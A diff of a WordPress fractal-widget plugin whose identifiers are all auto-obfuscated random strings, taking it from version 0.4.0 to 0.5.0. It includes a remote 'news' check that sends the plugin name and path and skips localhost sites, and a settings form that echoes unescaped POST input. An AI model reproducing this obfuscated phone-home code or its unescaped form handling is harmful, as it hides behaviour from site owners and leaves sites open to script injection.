@@ -3,142 +3,140 @@
 Plugin Name: Fractal-Explorer
 Plugin URI: http://web-fractals.sf.net/project.php
 Description: Sidebar widget for the presentation and visualization of colored julia and mandelbrot fractals. Animated zoom realized as GIF animation is used to dive into and explore the internal structure of fractals.
-Version: 0.4.0
+Version: 0.5.0
 Author: carlos26
 Author URI: http://web-fractals.sf.net/author.php
 */
 
-# @date 2010-07-09 16-35-47
-      abstract class Ssvbvpgfitakrlvqz {
- const Dgosrivzpi = 'options';
- const Bsnnuzjxiur = 'submit';
-   const Ejsrrzhflgyyur = 'title';
- const Maoyczqxxbrr = 'count';
-const Gzpyikqqfmnm = 'mode';
- const Eaeyqcvfjebzw = 'lang';
-const Sjwzcdrev = 'compids';
-  const Ugsmsppfd = 0;
-  const Ndwnvycir = 1;
-       const Nqboousdaswjd = 2;		
-        const Fvojylpshyy = 'backend-title';
-        const Fcjnvsqavmt = 'backend-count';
-    const Ktqebioscmgdtow = 'backend-compids';
- const Jiptqrrmnvhdwso = 'backend-mode';
-       const Ielekfndciy = 'backend-lang';
-const Akilasnxcpdorm = 'backend-head';
-       const Dbjuvokejrb = 'backend-foot';
-         const Pvubzmavvbnfn = 'backend-news';
-      const Yrtgxdnfjb = 'backend-info';
-      const Fqkkpiijsen = 101;
-     const Jwhhchxsrs = 102;
-         const Yoslsoyibbtyap = 103;
-        const Dvscmvsewcwde = 104;
-     const Trqmbixcya = 105;
-const Nbvpwmyyztosnfg = 106;
-        const Cdngdvzqgjhzc = 107;
-        const Xtiievqfvmgoa = 108;
-    const Qyiwydrgc = 109;
-         const Olbygeahsrqgvj = 110;
-    const Wagetyhoz = 111;
-         const Nymwvdtydmhpkr = 112;
-       const Svrxqdpwjyes = 120;
-       const Hrxskenlpbachb = 0;
-    const Kkqtazviuqd = 1;
-   const Ckmdpblwwn = 2;
-   const Yxreomrzyg = 3;
-      const Cxilyydmimksc = 4;
-      public function getYlirmndeijfqcgnawrtv($valwhvrf, $fduqggsfpvie, $crtcciggft, $bdntkcpnznk) {
- $options = get_option($this->createYxbshnrqskvzvs(self::Dgosrivzpi));
+# @date 2010-08-06 15-59-31
+  abstract class Jvqccfctmuzkb {
+   const Kzhhwcpzaqhw = 'options';
+ const Cbukybctcri = 'submit';
+const Wxugnqbjzjs = 'title';
+const Hheokaugjkw = 'count';
+const Lwxezkorbpne = 'mode';
+    const Xpmyvwbimneiawqf = 'lang';
+ const Xrkdraxnmq = 'compids';
+       const Hobekkyknenzhe = 0;
+  const Smiifdftj = 1;
+        const Pbgrkykkawyuex = 2;		
+const Szmlbjkcngeqr = 'backend-title';
+         const Yetdbsxfgcul = 'backend-count';
+         const Eauibzbpwr = 'backend-compids';
+        const Btkzntmucwaz = 'backend-mode';
+        const Iizbsuapradx = 'backend-lang';
+       const Fzhqssisdbk = 'backend-head';
+       const Yungoffxoeg = 'backend-foot';
+       const Mibnogieabb = 'backend-news';
+     const Zzqjhghay = 'backend-info';
+      const Erzfuaxqzex = 101;
+        const Uazddnivohkck = 102;
+     const Vqgnmvspfg = 103;
+      const Rklhefvniar = 104;
+     const Fsryxvkdwt = 105;
+         const Xfagdbluexevjo = 106;
+         const Flstpaetnlfups = 107;
+     const Lefnpwmnqg = 108;
+        const Xelxepecxmovz = 109;
+       const Xlomgsggwoqu = 110;
+         const Oyejzkgflpplxo = 111;
+         const Dqiljumciyolqb = 113;
+       const Fdxzwyywfuzh = 112;
+      const Airtqecmtrx = 120;
+        const Emrrljlnrfhadto = 0;
+        const Pufivbqxplcuvxr = 1;
+  const Sttesvcso = 2;
+       const Laodxwtazaovxx = 3;
+       const Cevhdiqodqsrgk = 4;
+       public function constructDrhhivgyltelvhlk($nqkujoziqu, $hvqzrltoc, $gjjuaavai, $jsfgorxbkzzd) {
+$options = get_option($this->buildXpqplmpqhjac(self::Kzhhwcpzaqhw));
          $title = $options['title'];
-   $compids = $this->constructZvghfaqqglnkk($options['compids'], $options['count']);
+         $compids = $this->getAhiavtvnimkhekh($options['compids'], $options['count']);
        $mode = $options['mode'];
        $lang = $options['lang'];
-    $karma_data = Ircqzlrddqiz::getInstance()->createVdmizibekgyy($compids);
-$translator = new Cdypajyhvijo($lang);
-   $renderer = $this->getPdsmijulrlekaifbrg($translator, $mode);
-       echo $valwhvrf;
-   echo $crtcciggft . $title . $bdntkcpnznk;
-     echo $renderer->buildHbqaehjwhfqnvahajx($karma_data);
- echo $fduqggsfpvie;
+         $karma_data = Itkqfkeyhxy::getInstance()->createYznfwrhqvpcphszmiq($compids);
+$translator = new Pwzxiyxkseef($lang);
+  $renderer = $this->buildRuawvtonrjpnoaq($translator, $mode);
+         echo $nqkujoziqu;
+   echo $gjjuaavai . $title . $jsfgorxbkzzd;
+    echo $renderer->constructCntugprrkmcjk($karma_data);
+        echo $hvqzrltoc;
    }
- public function buildVrawygpkbtuehd() {
-   $options = $this->createEgeosqvtkotjid();
+         public function setZtemdrkylpvlhh() {
+ $options = $this->buildOcgjlyrxqznrb();
          $title = $options['title'];
- $translator = new Cdypajyhvijo($options['lang']);
-       echo '<p>' . $translator->constructJmcemsjmzyjglo('backend.widgets.control.redirection', array(Cdypajyhvijo::Fmjxeqczph => $this->constructXupmqftcgebg())) . '</p>';
-     echo '<input type="hidden" id="' . $this->createYxbshnrqskvzvs(self::Bsnnuzjxiur) . '" name="' . $this->createYxbshnrqskvzvs(self::Bsnnuzjxiur) . '" value="1" />';
+ $translator = new Pwzxiyxkseef($options['lang']);
+     echo '<p>' . $translator->createQyorsqklkogkuqzloq('backend.widgets.control.redirection', array(Pwzxiyxkseef::Cxeyjspxdzfo => $this->queryFylkjuqipgy())) . '</p>';
+         echo '<input type="hidden" id="' . $this->buildXpqplmpqhjac(self::Cbukybctcri) . '" name="' . $this->buildXpqplmpqhjac(self::Cbukybctcri) . '" value="1" />';
    }
-  public function createEgeosqvtkotjid() {
-   $translator = new Cdypajyhvijo($this->getIruygdlkwikcytdm());
-$compids = explode(',', $this->createFuxuetsoqibulqbac());
+public function buildOcgjlyrxqznrb() {
+  $translator = new Pwzxiyxkseef($this->buildOujfamhcprnuu());
+        $compids = explode(',', $this->createWidamstmgdaffds());
 shuffle($compids);
      $compids = array_slice(
      $compids, 0, 
       min(
-$this->constructPuuckxdiqyopyupr(Ssvbvpgfitakrlvqz::Nymwvdtydmhpkr),
+        $this->getCzbyrphdywanawxx(Jvqccfctmuzkb::Fdxzwyywfuzh),
        count($compids)
    )
     );
- for($isDdffssirbyfifnw = 0; $isDdffssirbyfifnw < count($compids); $isDdffssirbyfifnw++) {
-        $compids[$isDdffssirbyfifnw] = trim($compids[$isDdffssirbyfifnw]);
+     for($arrGqkidtbntusm = 0; $arrGqkidtbntusm < count($compids); $arrGqkidtbntusm++) {
+    $compids[$arrGqkidtbntusm] = trim($compids[$arrGqkidtbntusm]);
    }
          $options = array(
-      'title'=>$translator->constructJmcemsjmzyjglo('frontend.title'),
+       'title'=>$translator->createQyorsqklkogkuqzloq('frontend.title'),
        'compids'=>implode(', ', $compids),
-'mode'=>self::Nqboousdaswjd,
-         'lang'=>$this->getIruygdlkwikcytdm(),
-         'count'=>mt_rand(
-$this->constructPuuckxdiqyopyupr(Ssvbvpgfitakrlvqz::Olbygeahsrqgvj),
-    $this->constructPuuckxdiqyopyupr(Ssvbvpgfitakrlvqz::Wagetyhoz)
-    ),
+ 'mode'=>self::Pbgrkykkawyuex,
+        'lang'=>$this->buildOujfamhcprnuu(),
+        'count'=>$this->getCzbyrphdywanawxx(Jvqccfctmuzkb::Dqiljumciyolqb)
     );
-        $opts = get_option($this->createYxbshnrqskvzvs(self::Dgosrivzpi));
+       $opts = get_option($this->buildXpqplmpqhjac(self::Kzhhwcpzaqhw));
   if (!empty($opts)) {
      foreach ($opts as $key=>$value) {
       $options[$key] = $value;
    }
    }
-   update_option($this->createYxbshnrqskvzvs(self::Dgosrivzpi), $options);
+  update_option($this->buildXpqplmpqhjac(self::Kzhhwcpzaqhw), $options);
         return $options;
    }
-     public function constructJqwrveysxgdenp() {
+       public function setJeqkafydnnmy() {
      $result = '';
-   $options = $this->createEgeosqvtkotjid();
- $translator = new Cdypajyhvijo($options['lang']);
-    if ( $_POST[$this->createYxbshnrqskvzvs(self::Bsnnuzjxiur)] !== null ) {
+ $options = $this->buildOcgjlyrxqznrb();
+ $translator = new Pwzxiyxkseef($options['lang']);
+ if ( $_POST[$this->buildXpqplmpqhjac(self::Cbukybctcri)] !== null ) {
       $valid = true;
-if ($this->constructPuuckxdiqyopyupr(self::Fqkkpiijsen)) {
-$options['title'] = $_POST[$this->createYxbshnrqskvzvs(self::Ejsrrzhflgyyur)];
+    if ($this->getCzbyrphdywanawxx(self::Erzfuaxqzex)) {
+    $options['title'] = $_POST[$this->buildXpqplmpqhjac(self::Wxugnqbjzjs)];
    }
-         if ($this->constructPuuckxdiqyopyupr(self::Jwhhchxsrs)) {
+      if ($this->getCzbyrphdywanawxx(self::Uazddnivohkck)) {
       if (
-  preg_match('/^\s*[0-9]+\s*$/', $_POST[$this->createYxbshnrqskvzvs(self::Maoyczqxxbrr)]) &&
-       (int) $_POST[$this->createYxbshnrqskvzvs(self::Maoyczqxxbrr)] >= $this->constructPuuckxdiqyopyupr(Ssvbvpgfitakrlvqz::Olbygeahsrqgvj) &&
-         (int) $_POST[$this->createYxbshnrqskvzvs(self::Maoyczqxxbrr)] <= $this->constructPuuckxdiqyopyupr(Ssvbvpgfitakrlvqz::Wagetyhoz)
+        preg_match('/^\s*[0-9]+\s*$/', $_POST[$this->buildXpqplmpqhjac(self::Hheokaugjkw)]) &&
+ (int) $_POST[$this->buildXpqplmpqhjac(self::Hheokaugjkw)] >= $this->getCzbyrphdywanawxx(Jvqccfctmuzkb::Xlomgsggwoqu) &&
+(int) $_POST[$this->buildXpqplmpqhjac(self::Hheokaugjkw)] <= $this->getCzbyrphdywanawxx(Jvqccfctmuzkb::Oyejzkgflpplxo)
      ) {
-        $options['count'] = $_POST[$this->createYxbshnrqskvzvs(self::Maoyczqxxbrr)];
+    $options['count'] = $_POST[$this->buildXpqplmpqhjac(self::Hheokaugjkw)];
 } else {
     $result .= '
    <div class="updated">
-        <p><strong>' . $translator->constructJmcemsjmzyjglo('backend.validation.count') . '</strong></p>
+         <p><strong>' . $translator->createQyorsqklkogkuqzloq('backend.validation.count') . '</strong></p>
         </div>
     ';
    }
    }
-  if ($this->constructPuuckxdiqyopyupr(self::Dvscmvsewcwde)) {
-       $options['mode'] = $_POST[$this->createYxbshnrqskvzvs(self::Gzpyikqqfmnm)];
+    if ($this->getCzbyrphdywanawxx(self::Rklhefvniar)) {
+    $options['mode'] = $_POST[$this->buildXpqplmpqhjac(self::Lwxezkorbpne)];
    }
-         if ($this->constructPuuckxdiqyopyupr(self::Trqmbixcya)) {
-        $options['lang'] = $_POST[$this->createYxbshnrqskvzvs(self::Eaeyqcvfjebzw)];
-     $translator->queryJjeixbcljboodlyu($options['lang']);
+   if ($this->getCzbyrphdywanawxx(self::Fsryxvkdwt)) {
+        $options['lang'] = $_POST[$this->buildXpqplmpqhjac(self::Xpmyvwbimneiawqf)];
+    $translator->buildLynrormeiykchpj($options['lang']);
    }
-   if ($this->constructPuuckxdiqyopyupr(self::Yoslsoyibbtyap)) {
-      if (preg_match('/^\s*([0-9]+,\s*)*[0-9]+\s*$/', $_POST[$this->createYxbshnrqskvzvs(self::Sjwzcdrev)])) {
-       $options['compids'] = $_POST[$this->createYxbshnrqskvzvs(self::Sjwzcdrev)];
+   if ($this->getCzbyrphdywanawxx(self::Vqgnmvspfg)) {
+    if (preg_match('/^\s*([0-9]+,\s*)*[0-9]+\s*$/', $_POST[$this->buildXpqplmpqhjac(self::Xrkdraxnmq)])) {
+     $options['compids'] = $_POST[$this->buildXpqplmpqhjac(self::Xrkdraxnmq)];
 } else {
     $result .= '
    <div class="updated">
-<p><strong>' . $translator->constructJmcemsjmzyjglo('backend.validation.compids') . '</strong></p>
+ <p><strong>' . $translator->createQyorsqklkogkuqzloq('backend.validation.compids') . '</strong></p>
         </div>
     ';
    }
@@ -146,10 +144,10 @@ $options['title'] = $_POST[$this->createYxbshnrqskvzvs(self::Ejsrrzhflgyyur)];
    if ($result === '') {
     $result .= '
    <div class="updated">
-         <p><strong>' . $translator->constructJmcemsjmzyjglo('backend.updated') . '</strong></p>
+<p><strong>' . $translator->createQyorsqklkogkuqzloq('backend.updated') . '</strong></p>
         </div>
     ';
-   update_option($this->createYxbshnrqskvzvs(self::Dgosrivzpi), $options);
+  update_option($this->buildXpqplmpqhjac(self::Kzhhwcpzaqhw), $options);
    }
    }
          $title = $options['title'];
@@ -157,99 +155,99 @@ $options['title'] = $_POST[$this->createYxbshnrqskvzvs(self::Ejsrrzhflgyyur)];
    $compids = $options['compids'];
        $mode = $options['mode'];
        $lang = $options['lang'];
-      $infoButton = '<span class="' . $this->setEwmmxmqzpjihd(self::Yrtgxdnfjb) . '" onclick="document.getElementsByName(\'' . $this->setEwmmxmqzpjihd(self::Dbjuvokejrb) . '\')[0].style.display=\'block\'; return false;">?</span>';
+     $infoButton = '<span class="' . $this->queryYvrelrzjxxo(self::Zzqjhghay) . '" onclick="document.getElementsByName(\'' . $this->queryYvrelrzjxxo(self::Yungoffxoeg) . '\')[0].style.display=\'block\'; return false;">?</span>';
     $result .= '
  <div class="wrap"> 
       <form name="form1" method="post" action="' . $_SERVER['REQUEST_URI'] . '">
-<h2>' . $translator->constructJmcemsjmzyjglo('backend.title', array(Cdypajyhvijo::Fmjxeqczph => $this->constructXupmqftcgebg())) . '</h2> 
+        <h2>' . $translator->createQyorsqklkogkuqzloq('backend.title', array(Pwzxiyxkseef::Cxeyjspxdzfo => $this->queryFylkjuqipgy())) . '</h2> 
     ';
-    if ($this->constructPuuckxdiqyopyupr(self::Nbvpwmyyztosnfg)) {
+       if ($this->getCzbyrphdywanawxx(self::Xfagdbluexevjo)) {
     $result .= '
-   <div class="' . $this->setEwmmxmqzpjihd(self::Akilasnxcpdorm) . '">' . 
-   $translator->constructJmcemsjmzyjglo('backend.manual.top') . 
+<div class="' . $this->queryYvrelrzjxxo(self::Fzhqssisdbk) . '">' . 
+    $translator->createQyorsqklkogkuqzloq('backend.manual.top') . 
          '</div>
         <br />
     ';
    }
-if ($this->constructPuuckxdiqyopyupr(self::Fqkkpiijsen)) {
+    if ($this->getCzbyrphdywanawxx(self::Erzfuaxqzex)) {
     $result .= '
       <!-- title -->
-    <p class="' . $this->setEwmmxmqzpjihd(self::Fvojylpshyy) . '">
-   <label for="' . $this->createYxbshnrqskvzvs(self::Ejsrrzhflgyyur) . '">
-        <b>' . $translator->constructJmcemsjmzyjglo('backend.fieldlabel.title') . '</b>:<br />
-         <span>' . $translator->constructJmcemsjmzyjglo('backend.manual.title') . '</span><br />
-<input id="' . $this->createYxbshnrqskvzvs(self::Ejsrrzhflgyyur) . '" name="' . $this->createYxbshnrqskvzvs(self::Ejsrrzhflgyyur) . '" type="text" value="'.$title.'" />
+      <p class="' . $this->queryYvrelrzjxxo(self::Szmlbjkcngeqr) . '">
+       <label for="' . $this->buildXpqplmpqhjac(self::Wxugnqbjzjs) . '">
+         <b>' . $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.title') . '</b>:<br />
+<span>' . $translator->createQyorsqklkogkuqzloq('backend.manual.title') . '</span><br />
+        <input id="' . $this->buildXpqplmpqhjac(self::Wxugnqbjzjs) . '" name="' . $this->buildXpqplmpqhjac(self::Wxugnqbjzjs) . '" type="text" value="'.$title.'" />
 </label>
       </p>
     ';
    }
-         if ($this->constructPuuckxdiqyopyupr(self::Jwhhchxsrs)) {
+      if ($this->getCzbyrphdywanawxx(self::Uazddnivohkck)) {
     $result .= '
       <!-- count -->
-    <p class="' . $this->setEwmmxmqzpjihd(self::Fcjnvsqavmt) . '">
- <label for="' . $this->createYxbshnrqskvzvs(self::Maoyczqxxbrr) . '">
-        <b>' . $translator->constructJmcemsjmzyjglo('backend.fieldlabel.count') . '</b>:<br />
-         <span>' . $translator->constructJmcemsjmzyjglo('backend.manual.count') . '</span><br />
-      <input id="' . $this->createYxbshnrqskvzvs(self::Maoyczqxxbrr) . '" name="' . $this->createYxbshnrqskvzvs(self::Maoyczqxxbrr) . '" type="text" value="'.$count.'" />
+     <p class="' . $this->queryYvrelrzjxxo(self::Yetdbsxfgcul) . '">
+       <label for="' . $this->buildXpqplmpqhjac(self::Hheokaugjkw) . '">
+         <b>' . $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.count') . '</b>:<br />
+<span>' . $translator->createQyorsqklkogkuqzloq('backend.manual.count') . '</span><br />
+        <input id="' . $this->buildXpqplmpqhjac(self::Hheokaugjkw) . '" name="' . $this->buildXpqplmpqhjac(self::Hheokaugjkw) . '" type="text" value="'.$count.'" />
 </label>
       </p>
     ';
    }
-   if ($this->constructPuuckxdiqyopyupr(self::Yoslsoyibbtyap)) {
+   if ($this->getCzbyrphdywanawxx(self::Vqgnmvspfg)) {
     $result .= '
         <!-- compids -->
-        <p class="' . $this->setEwmmxmqzpjihd(self::Ktqebioscmgdtow) . '">
-        <label for="' . $this->createYxbshnrqskvzvs(self::Sjwzcdrev) . '">
-<b>' . $translator->constructJmcemsjmzyjglo('backend.fieldlabel.compids') . '</b>:<br />
-       <span>' . $translator->constructJmcemsjmzyjglo('backend.manual.compids', array(Cdypajyhvijo::Vxouoqivncmez => $this->constructPuuckxdiqyopyupr(Ssvbvpgfitakrlvqz::Xtiievqfvmgoa))) . '</span><br />
-  <input id="' . $this->createYxbshnrqskvzvs(self::Sjwzcdrev) . '" name="' . $this->createYxbshnrqskvzvs(self::Sjwzcdrev) . '" type="text" value="'.$compids.'" />
+   <p class="' . $this->queryYvrelrzjxxo(self::Eauibzbpwr) . '">
+      <label for="' . $this->buildXpqplmpqhjac(self::Xrkdraxnmq) . '">
+ <b>' . $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.compids') . '</b>:<br />
+   <span>' . $translator->createQyorsqklkogkuqzloq('backend.manual.compids', array(Pwzxiyxkseef::Aatwqgkmagg => $this->getCzbyrphdywanawxx(Jvqccfctmuzkb::Lefnpwmnqg))) . '</span><br />
+        <input id="' . $this->buildXpqplmpqhjac(self::Xrkdraxnmq) . '" name="' . $this->buildXpqplmpqhjac(self::Xrkdraxnmq) . '" type="text" value="'.$compids.'" />
 </label>
       </p>
     ';
    }
-  if ($this->constructPuuckxdiqyopyupr(self::Dvscmvsewcwde)) {
+    if ($this->getCzbyrphdywanawxx(self::Rklhefvniar)) {
     $result .= '
      <!-- mode -->
-        <p class="' . $this->setEwmmxmqzpjihd(self::Jiptqrrmnvhdwso) . '">
- <label for="' . $this->createYxbshnrqskvzvs(self::Gzpyikqqfmnm) . '">
-       <b>' . $translator->constructJmcemsjmzyjglo('backend.fieldlabel.mode') . '</b>:<br />
-        <span>' . $translator->constructJmcemsjmzyjglo('backend.manual.mode') . '</span><br />
-    <select id="' . $this->createYxbshnrqskvzvs(self::Gzpyikqqfmnm) . '" name="' . $this->createYxbshnrqskvzvs(self::Gzpyikqqfmnm) . '">
-' . $this->getLruyewqkwcdzflc(self::Ugsmsppfd, $translator->constructJmcemsjmzyjglo('backend.fieldlabel.image-mode'), $mode) . '
-    ' . $this->getLruyewqkwcdzflc(self::Ndwnvycir, $translator->constructJmcemsjmzyjglo('backend.fieldlabel.animation-mode'), $mode) . '
-    ' . $this->getLruyewqkwcdzflc(self::Nqboousdaswjd, $translator->constructJmcemsjmzyjglo('backend.fieldlabel.image-animation-mode'), $mode) . '
+     <p class="' . $this->queryYvrelrzjxxo(self::Btkzntmucwaz) . '">
+        <label for="' . $this->buildXpqplmpqhjac(self::Lwxezkorbpne) . '">
+        <b>' . $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.mode') . '</b>:<br />
+         <span>' . $translator->createQyorsqklkogkuqzloq('backend.manual.mode') . '</span><br />
+        <select id="' . $this->buildXpqplmpqhjac(self::Lwxezkorbpne) . '" name="' . $this->buildXpqplmpqhjac(self::Lwxezkorbpne) . '">
+       ' . $this->constructDaygjgbphs(self::Hobekkyknenzhe, $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.image-mode'), $mode) . '
+      ' . $this->constructDaygjgbphs(self::Smiifdftj, $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.animation-mode'), $mode) . '
+       ' . $this->constructDaygjgbphs(self::Pbgrkykkawyuex, $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.image-animation-mode'), $mode) . '
  </select>
 </label>
       </p>
     ';
    }
-         if ($this->constructPuuckxdiqyopyupr(self::Trqmbixcya)) {
+   if ($this->getCzbyrphdywanawxx(self::Fsryxvkdwt)) {
     $result .= '
      <!-- lang -->
-    <p class="' . $this->setEwmmxmqzpjihd(self::Ielekfndciy) . '">
-  <label for="' . $this->createYxbshnrqskvzvs(self::Eaeyqcvfjebzw) . '">
- <b>' . $translator->constructJmcemsjmzyjglo('backend.fieldlabel.language') . '</b>:<br />
-  <span>' . $translator->constructJmcemsjmzyjglo('backend.manual.language') . '</span><br />
-      <select id="' . $this->createYxbshnrqskvzvs(self::Eaeyqcvfjebzw) . '" name="' . $this->createYxbshnrqskvzvs(self::Eaeyqcvfjebzw) . '">
-' . $this->getLruyewqkwcdzflc($this->getIruygdlkwikcytdm(), $translator->constructJmcemsjmzyjglo('backend.fieldlabel.default'), $lang) . '
-        ' . $this->getLruyewqkwcdzflc(Cdypajyhvijo::Zkrrnyvuaclr, $translator->constructJmcemsjmzyjglo('backend.fieldlabel.english'), $lang) . '
-        ' . $this->getLruyewqkwcdzflc(Cdypajyhvijo::Jagomtqbmjkkk, $translator->constructJmcemsjmzyjglo('backend.fieldlabel.german'), $lang) . '
-       ' . $this->getLruyewqkwcdzflc(Cdypajyhvijo::Hdgkupxfadj, $translator->constructJmcemsjmzyjglo('backend.fieldlabel.spanish'), $lang) . '
+     <p class="' . $this->queryYvrelrzjxxo(self::Iizbsuapradx) . '">
+  <label for="' . $this->buildXpqplmpqhjac(self::Xpmyvwbimneiawqf) . '">
+  <b>' . $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.language') . '</b>:<br />
+   <span>' . $translator->createQyorsqklkogkuqzloq('backend.manual.language') . '</span><br />
+      <select id="' . $this->buildXpqplmpqhjac(self::Xpmyvwbimneiawqf) . '" name="' . $this->buildXpqplmpqhjac(self::Xpmyvwbimneiawqf) . '">
+ ' . $this->constructDaygjgbphs($this->buildOujfamhcprnuu(), $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.default'), $lang) . '
+         ' . $this->constructDaygjgbphs(Pwzxiyxkseef::Gqnqhwoixnr, $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.english'), $lang) . '
+         ' . $this->constructDaygjgbphs(Pwzxiyxkseef::Ijjgchkietbh, $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.german'), $lang) . '
+' . $this->constructDaygjgbphs(Pwzxiyxkseef::Ntecnscfeszx, $translator->createQyorsqklkogkuqzloq('backend.fieldlabel.spanish'), $lang) . '
  </select>
 </label>
       </p>
     ';
    }
-  if ($this->constructPuuckxdiqyopyupr(self::Cdngdvzqgjhzc)) {
+       if ($this->getCzbyrphdywanawxx(self::Flstpaetnlfups)) {
     $result .= '
  ' . $infoButton . '
-    <div name="' . $this->setEwmmxmqzpjihd(self::Dbjuvokejrb) . '" class="' . $this->setEwmmxmqzpjihd(self::Dbjuvokejrb) . '">
-       ' . $translator->constructJmcemsjmzyjglo('backend.manual.bottom')
+    <div name="' . $this->queryYvrelrzjxxo(self::Yungoffxoeg) . '" class="' . $this->queryYvrelrzjxxo(self::Yungoffxoeg) . '">
+        ' . $translator->createQyorsqklkogkuqzloq('backend.manual.bottom')
    ;
-        if ($this->constructPuuckxdiqyopyupr(self::Qyiwydrgc)) {
+      if ($this->getCzbyrphdywanawxx(self::Xelxepecxmovz)) {
    $result .= 
-  '<div class="' . $this->setEwmmxmqzpjihd(self::Pvubzmavvbnfn) . '">' .
-    $this->setWqgapqxuwrizbmpvk($translator) .
+'<div class="' . $this->queryYvrelrzjxxo(self::Mibnogieabb) . '">' .
+   $this->constructGqmsgwsogaqwyawlofmn($translator) .
  '</div>';
    }
     $result .= '
@@ -258,49 +256,49 @@ if ($this->constructPuuckxdiqyopyupr(self::Fqkkpiijsen)) {
    }
     $result .= '
     <!-- update switch -->
- <input type="hidden" id="' . $this->createYxbshnrqskvzvs(self::Bsnnuzjxiur) . '" name="' . $this->createYxbshnrqskvzvs(self::Bsnnuzjxiur) . '" value="1" />				
+     <input type="hidden" id="' . $this->buildXpqplmpqhjac(self::Cbukybctcri) . '" name="' . $this->buildXpqplmpqhjac(self::Cbukybctcri) . '" value="1" />				
   <div class="submit">
-      <input type="submit" name="submit" value="' . $translator->constructJmcemsjmzyjglo('backend.save') . ' &raquo;" />
+       <input type="submit" name="submit" value="' . $translator->createQyorsqklkogkuqzloq('backend.save') . ' &raquo;" />
         </div>
          </form>
         </div>
     ';
      echo $result;
    }
- protected function getLruyewqkwcdzflc($hgdjllfodh, $ctmjkykxfd, $pmpaxxwbcbe) {
-  $selected = ($pmpaxxwbcbe == $hgdjllfodh ? 'selected' : '');
-    return '<option value="' . $hgdjllfodh . '" ' . $selected . '>' . $ctmjkykxfd . '</option>';
+     protected function constructDaygjgbphs($coxjwybzinrbb, $gmgwiywloxx, $qnhzxvtpof) {
+    $selected = ($qnhzxvtpof == $coxjwybzinrbb ? 'selected' : '');
+        return '<option value="' . $coxjwybzinrbb . '" ' . $selected . '>' . $gmgwiywloxx . '</option>';
    }
-    protected function getIruygdlkwikcytdm() {
-        $arrMartefxsvqhugpev = get_locale();
-$arrMartefxsvqhugpev = substr($arrMartefxsvqhugpev, 0, 2);
-   switch ($arrMartefxsvqhugpev) {
-    case Cdypajyhvijo::Zkrrnyvuaclr:
-     case Cdypajyhvijo::Jagomtqbmjkkk:
-   case Cdypajyhvijo::Hdgkupxfadj:
+   protected function buildOujfamhcprnuu() {
+      $limitOfcuxexpsmfa = get_locale();
+      $limitOfcuxexpsmfa = substr($limitOfcuxexpsmfa, 0, 2);
+ switch ($limitOfcuxexpsmfa) {
+   case Pwzxiyxkseef::Gqnqhwoixnr:
+    case Pwzxiyxkseef::Ijjgchkietbh:
+    case Pwzxiyxkseef::Ntecnscfeszx:
         break;
 default:
-  $arrMartefxsvqhugpev = Cdypajyhvijo::Zkrrnyvuaclr;
+         $limitOfcuxexpsmfa = Pwzxiyxkseef::Gqnqhwoixnr;
         break;
    }
-return $arrMartefxsvqhugpev;
+        return $limitOfcuxexpsmfa;
    }
-  public function getWpcshgzgsaieyfzyi() {
-         echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->queryYjcxzdwduvn() . '/style.css" type="text/css" media="screen" />';
+ public function buildHipkfewuavlfen() {
+       echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->createUzjsncayemhvatxgdy() . '/style.css" type="text/css" media="screen" />';
    }
-     public function setHvndterkeb() {
-echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->queryYjcxzdwduvn() . '/style2.css" type="text/css" media="screen" />';
+public function constructOsyewrwah() {
+        echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->createUzjsncayemhvatxgdy() . '/style2.css" type="text/css" media="screen" />';
    }
- public function setWqgapqxuwrizbmpvk($yysqrcvg) {
+   public function constructGqmsgwsogaqwyawlofmn($uvdtdwriveh) {
      $result = '';
-        $nc = $this->createYxcfrhggbklaen();
-  $pluginName = $this->queryYjcxzdwduvn();
+        $nc = $this->buildVgsgwcmkimohayi();
+$pluginName = $this->createUzjsncayemhvatxgdy();
       $transKey = 'news://plugins/' . $pluginName;
        if (	false === ( $json = get_transient($transKey) ) && 
     !preg_match('/localhost/', get_option('siteurl')) &&
  !preg_match('/127.0.0.1/', get_option('siteurl'))
      ) {
-   $msgs = $nc->setRkbvkcywyaguxm(
+     $msgs = $nc->setCjfhvxrjorcyirww(
      $pluginName, 
     WP_PLUGIN_DIR . '/' . $pluginName . '/' . $pluginName . '.php'
     );
@@ -311,72 +309,72 @@ $json = @json_encode($msgs);
          return;
    }
       $msgs = @json_decode($json, true);
-   if (count($msgs) > 0 && $msgs[Stipnyiukckk::Ynpidtzxmqqhwv] === true) {
-  $result .= $yysqrcvg->constructJmcemsjmzyjglo('backend.news.upgrade');
+ if (count($msgs) > 0 && $msgs[Cxdsskkzqxpsr::Xnpugewscco] === true) {
+      $result .= $uvdtdwriveh->createQyorsqklkogkuqzloq('backend.news.upgrade');
    }
        return $result;
    }
-protected function constructZvghfaqqglnkk($nnedvpdf, $zoeclrhwlmj) {
-        $nnedvpdf = explode(',', $nnedvpdf);
-    $rotationMode = $this->constructPuuckxdiqyopyupr(Ssvbvpgfitakrlvqz::Svrxqdpwjyes);
+      protected function getAhiavtvnimkhekh($zoyjewqef, $kvfaonfplx) {
+$zoyjewqef = explode(',', $zoyjewqef);
+   $rotationMode = $this->getCzbyrphdywanawxx(Jvqccfctmuzkb::Airtqecmtrx);
       switch ($rotationMode) {
          case 0:
- shuffle($nnedvpdf);
+  shuffle($zoyjewqef);
         break;
          case 1:
-$nnedvpdf = $this->queryBhtlavlzfkyh($nnedvpdf, $this->buildOavmirvgwheark());
+ $zoyjewqef = $this->setNdqtnqnpaebdnopke($zoyjewqef, $this->setDufqvnxkfsmq());
         break;
          case 2:
          $dateid = round(time() / (60*60*24));
-         $nnedvpdf = $this->queryBhtlavlzfkyh($nnedvpdf, $dateid);
+    $zoyjewqef = $this->setNdqtnqnpaebdnopke($zoyjewqef, $dateid);
         break;
          case 3:
